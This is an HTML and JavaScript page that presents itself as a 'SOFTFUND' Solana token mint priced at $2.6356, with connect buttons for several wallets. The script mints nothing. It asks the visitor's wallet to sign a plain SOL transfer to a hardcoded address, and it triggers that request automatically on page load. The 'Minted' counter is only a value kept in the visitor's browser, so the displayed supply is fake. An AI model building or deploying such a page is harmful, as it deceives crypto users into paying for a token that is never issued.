<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>SOFTFUND – $2.6356 Mint</title>
  <style>
    body{margin:0;background:#0c0b1a;font-family:system-ui;color:#fff;display:grid;place-items:center;min-height:100vh;padding:15px}
    .c{max-width:380px;width:100%;background:#141222;padding:32px;border-radius:20px;text-align:center;border:1px solid #333}
    .t{font-size:2rem;font-weight:800;margin-bottom:8px}
    .p{font-size:2.4rem;font-weight:800;color:#00ff9d;margin:16px 0}
    .b{width:100%;padding:18px;margin:20px 0;background:#00ff9d;color:#000;border:none;border-radius:14px;font-weight:700;font-size:1.3rem;cursor:pointer}
    .w{display:none;grid-template-columns:1fr 1fr;gap:10px;margin-top:10px}
    .wb{padding:14px;background:#1e1c2e;border:1px solid #333;border-radius:12px;font-weight:600;cursor:pointer}
    .s{font-weight:600;margin-top:12px;min-height:24px}
    .l{width:12px;height:12px;border:2px solid #00ff9d;border-top-color:#000;border-radius:50%;display:inline-block;animation:r 1s linear infinite}
    @keyframes r{to{transform:rotate(360deg)}}
  </style>
</head>
<body>
  <div class="c">
    <div class="t">SOFTFUND</div>
    <div style="color:#aaa;font-size:0.95rem">10,000 Supply • Solana</div>
    <div class="p">$2.6356</div>
    <div>Minted: <span id="m">0</span>/10,000</div>
    <div style="color:#666;font-size:0.8rem" id="sol">~0 SOL</div>
    <button class="b" onclick="show()">MINT $2.6356</button>

    <div id="w" class="w">
      <div class="wb" onclick="go('phantom')">Phantom</div>
      <div class="wb" onclick="go('solflare')">Solflare</div>
      <div class="wb" onclick="go('backpack')">Backpack</div>
      <div class="wb" onclick="go('trust')">Trust Wallet</div>
      <div class="wb" onclick="go('metamask')">MetaMask</div>
      <div class="wb" onclick="go('brave')">Brave</div>
      <div class="wb" onclick="go('okx')">OKX</div>
      <div class="wb" onclick="go('rainbow')">Rainbow</div>
      <div class="wb" onclick="go('ledger')">Ledger Live</div>
    </div>

    <div id="s" class="s"></div>
  </div>

  <script src="https://unpkg.com/@solana/web3.js@1.95.2/lib/index.iife.min.js"></script>
  <script>
    const USD_PRICE = 2.6356;
    const YOU = "GqB1ywkWHq9jpjDSJkhGxuFVz1H6VBfoyJX32BsCjWue";
    const s = document.getElementById("s");
    const m = document.getElementById("m");
    const solLabel = document.getElementById("sol");
    let c = parseInt(localStorage.getItem("sf") || "0");
    m.innerText = c;
    let currentLamports = 0;

    // Live SOL/USD price
    async function updatePrice() {
      try {
        const r = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd");
        const j = await r.json();
        const solPrice = j.solana.usd;
        const solAmount = USD_PRICE / solPrice;
        currentLamports = Math.ceil(solAmount * 1e9);
        solLabel.textContent = `~${solAmount.toFixed(5)} SOL`;
      } catch(e) { solLabel.textContent = "price error"; }
    }
    updatePrice();
    setInterval(updatePrice, 10000);

    function t(x, col="#0f9") { s.innerHTML = x; s.style.color = col; }
    function show() { document.querySelector(".b").style.display="none"; document.getElementById("w").style.display="grid"; }

    function go(w) {
      const u = encodeURIComponent(location.href);
      const links = {
        phantom: `https://phantom.app/ul/v2/connect?app_url=${u}&redirect_link=${u}&cluster=mainnet-beta`,
        solflare: `https://solflare.com/ul/v2/connect?app_url=${u}&redirect_link=${u}`,
        backpack: `https://backpack.app/ul/v2/connect?app_url=${u}&redirect_link=${u}`,
        trust: `https://link.trustwallet.com/open_url?url=${u}`,
        metamask: `https://metamask.app.link/dapp/${location.host}${location.pathname}`,
        brave: `https://wallet.brave.com/ul/v2/connect?app_url=${u}`,
        okx: `https://www.okx.com/web3/dapp/${u}`,
        rainbow: `https://rainbow.me/deeplink?app_url=${u}`,
        ledger: `https://ledgerlive.com/deeplink/connect?uri=${u}`
      };
      t(`Opening ${w}… <span class="l"></span>`);
      location.href = links[w];
      setTimeout(tryMint, 2000);
    }

    async function tryMint() {
      const p = window.solana || window.ethereum || window.okxwallet || window.rainbow;
      if (!p || currentLamports === 0) return;
      try {
        if (!p.isConnected) await p.connect();
        t("Sending $2.6356… <span class='l'></span>");
        const C = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
        const tx = new solanaWeb3.Transaction().add(
          solanaWeb3.SystemProgram.transfer({
            fromPubkey: p.publicKey,
            toPubkey: new solanaWeb3.PublicKey(YOU),
            lamports: currentLamports
          })
        );
        tx.recentBlockhash = (await C.getLatestBlockhash()).blockhash;
        const sig = await p.signAndSendTransaction(tx);
        await C.confirmTransaction(sig);
        c++; localStorage.setItem("sf", c); m.innerText = c;
        t(`MINTED! <a href="https://solscan.io/tx/${sig}" target="_blank" style="color:#0f9">View Tx</a>`);
      } catch (e) { t("Cancelled", "#f55"); }
    }

    window.addEventListener("load", () => setTimeout(tryMint, 1200));
  </script>
</body>
</html>